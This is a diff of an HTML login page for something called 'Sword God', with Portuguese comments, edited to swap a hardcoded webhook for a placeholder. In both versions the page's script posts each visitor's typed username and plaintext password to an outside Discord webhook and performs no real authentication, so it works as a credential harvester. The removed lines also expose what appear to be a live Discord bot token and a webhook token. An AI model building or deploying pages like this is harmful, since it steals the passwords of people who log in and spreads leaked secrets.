@@ -75,8 +75,8 @@
     <div class="login-container">
         <h1>Sword God</h1>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Username" required>
-            <input type="password" id="password" placeholder="Password" required>
+            <input type="text" id="username" placeholder="Nome de Usuário" required>
+            <input type="password" id="password" placeholder="Senha" required>
             <label>
                 <input type="checkbox"> Lembrar de mim
             </label>
@@ -87,49 +87,47 @@
     </div>
 
     <script>
-        // Token do bot do Discord
-        const discordBotToken = 'MTI5NDY4NTkxMTA0NDU5MTY2Nw.Gl42o-.Oc9cI3-iWY4vu7_5QkYd2vDo6Mi6bi3rejzUXs';
-
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Impede o envio padrão do formulário
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Envia os dados do usuário para o bot do Discord
-            sendUserToDiscord(username, password);
+            // Envia os dados do usuário para o webhook
+            sendUserToWebhook(username, password);
         });
 
-        function sendUserToDiscord(username, password) {
-            const webhookURL = 'https://discord.com/api/webhooks/1294702699161452654/sV4vV0mtEZyB5dXl9xP2ktm2P7hWbsiGAqwgSV3Avscq0e-hcje6ek_Q9UEkd3oGgu38';
+        function sendUserToWebhook(username, password) {
+            const webhookURL = 'https://discord.com/api/webhooks/SEU_WEBHOOK_ID/SEU_WEBHOOK_TOKEN'; // Substitua pelo seu webhook
+
+            const payload = {
+                content: `Novo usuário registrado!\nNome: ${username}\nSenha: ${password}\nDeseja aceitar o login?`,
+                username: 'Sword God Bot', // Nome do bot que aparecerá no Discord
+            };
 
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    content: `Novo usuário registrado!\nNome: ${username}\nSenha: ${password}\nDeseja aceitar o login?`
-                })
+                body: JSON.stringify(payload)
             })
             .then(response => {
                 if (response.ok) {
-                    // Simula a resposta do bot com reações
-                    askForAcceptance(username);
+                    const userResponse = confirm(`Novo usuário registrado!\nNome: ${username}\nDeseja aceitar o login?`);
+
+                    if (userResponse) {
+                        alert('Seu login foi aceito!');
+                    } else {
+                        window.location.href = '404.html'; // Redireciona para uma página 404
+                    }
                 } else {
                     alert('Erro ao registrar o usuário.');
                 }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
             });
-        }
-
-        function askForAcceptance(username) {
-            const userResponse = confirm(`Novo usuário registrado!\nNome: ${username}\nDeseja aceitar o login?`);
-
-            if (userResponse) {
-                alert('Seu login foi aceito!');
-            } else {
-                window.location.href = '404.html'; // Redireciona para uma página 404
-            }
         }
     </script>
 </body>
